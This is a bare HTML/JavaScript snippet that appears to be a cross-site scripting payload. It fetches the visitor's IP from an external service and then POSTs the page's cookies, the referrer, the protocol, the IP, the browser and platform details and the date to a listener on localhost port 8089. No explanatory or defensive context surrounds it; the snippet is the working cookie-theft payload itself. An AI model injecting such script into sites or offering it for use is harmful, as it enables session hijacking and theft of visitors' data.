<script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
<script>
var messenger = new XMLHttpRequest();
messenger.open("POST", "http://localhost:8089", true);
messenger.send(document.cookie + "#" + document.referrer + "#" + window.location.protocol + "#" + userip + "#" + navigator.appName + "-" + navigator.product + "#" + navigator.platform + "#" + Date());
</script>